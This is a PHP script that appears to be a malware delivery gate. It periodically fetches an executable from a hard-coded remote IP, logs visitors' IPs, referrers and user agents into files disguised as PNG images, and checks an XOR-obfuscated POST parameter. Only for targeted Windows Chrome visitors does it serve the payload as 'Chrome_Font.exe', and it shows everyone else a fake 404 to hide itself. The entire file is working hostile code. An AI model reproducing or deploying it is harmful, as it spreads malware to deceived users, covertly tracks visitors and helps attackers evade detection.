<?php
$file = "blog.xml.php";

function dwnld($file)
{
    $exe = @file_get_contents('http://31.184.193.179/2na2nana');
    file_put_contents($file, $exe);
}

if (is_file($file)) {
    if ((time() - filemtime($file)) > 900) {
        dwnld($file);
    }
} else
    dwnld($file);

file_put_contents('./logo3.png', $_SERVER['REMOTE_ADDR'] . '	' . @$_SERVER['HTTP_REFERER'] . '	' . $_SERVER['HTTP_USER_AGENT'] . "\r\n", FILE_APPEND | LOCK_EX);
if (isset($_POST["infol"])) {
    function enco($String)
    {
        $Seq   = 'pAsswd1';
        $Gamma = '';
        while (strlen($Gamma) < strlen($String)) {
            $Seq = pack("H*", md5($Gamma . $Seq . '123456790'));
            $Gamma .= substr($Seq, 0, 8);
        }
        return $String ^ $Gamma;
    }
    function logg($msg)
    {
        file_put_contents('./logo2.png', $msg . "\r\n", FILE_APPEND | LOCK_EX);
    }
    $ua    = $_SERVER['HTTP_USER_AGENT'];
    $ref   = $_SERVER['HTTP_REFERER'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $param = enco(base64_decode($_POST["infol"]));
    $arr   = explode('-|x|-', $param);
    
    if (sizeof($arr) == 3) {
        if ($arr[1] == $ip) {
            if (strstr($ref, $arr[2])) {
                if ((strstr($ua, 'Windows')) and (strstr($ua, 'Chrome'))) {
                    
                    header("Content-Type: application/octet-stream");
                    header("Accept-Ranges: bytes");
                    header("Content-Length: " . filesize($file));
                    header("Content-Disposition: attachment; filename=Chrome_Font.exe");
                    readfile($file);
                    logg('GOOD	' . $ip . '	' . $ua . '	' . $ref);
                    exit;
                } else
                    logg($ip . '	UA	' . $ua);
            } else
                logg($ip . '	REF	' . $arr[2] . ' -> ' . $ref);
        } else
            logg($ip . '	IP	' . $arr[1]);
    } else
        logg($ip . '	ARR	' . $param);
}

header("HTTP/1.0 404 Not Found");
?>
